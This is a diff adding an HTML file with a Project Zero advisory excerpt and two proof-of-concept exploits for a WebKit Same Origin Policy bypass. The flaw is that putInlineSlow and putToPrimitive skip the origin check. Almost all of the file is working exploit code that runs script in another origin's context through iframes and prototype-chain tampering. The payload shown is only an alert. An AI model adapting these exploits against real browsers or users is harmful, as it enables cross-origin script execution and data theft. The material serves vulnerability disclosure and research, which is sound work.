@@ -1,0 +1,58 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1240
+
+JSObject::putInlineSlow and JSValue::putToPrimitive use getPrototypeDirect instead of getPrototype to get an object's prototype. So JSDOMWindow::getPrototype which checks the Same Origin Policy is not called.
+
+The PoC shows to call a setter of another origin's object.
+
+PoC 1 - JSValue::putToPrimitive:
+-->
+
+<body>
+<script>
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let loc = f.contentWindow.location;
+f.onload = () => {
+    let a = 1.2;
+    a.__proto__.__proto__ = f.contentWindow;
+
+    a['test'] = {toString: function () {
+        arguments.callee.caller.constructor('alert(location)')();
+    }};
+};
+f.src = 'data:text/html,' + `<iframe></iframe><script>
+Object.prototype.__defineSetter__('test', v => {
+    'a' + v;
+});
+
+</scrip` + `t>`;
+
+</script>
+</body>
+
+<!--
+PoC 2 - JSObject::putInlineSlow:
+<body>
+<script>
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let loc = f.contentWindow.location;
+f.onload = () => {
+    let a = {
+        __proto__: f.contentWindow
+    };
+
+    a['test'] = {toString: function () {
+        arguments.callee.caller.constructor('alert(location)')();
+    }};
+};
+f.src = 'data:text/html,' + `<iframe></iframe><script>
+Object.prototype.__defineSetter__('test', v => {
+    'a' + v;
+});
+
+</scrip` + `t>`;
+</script>
+</body>
+-->
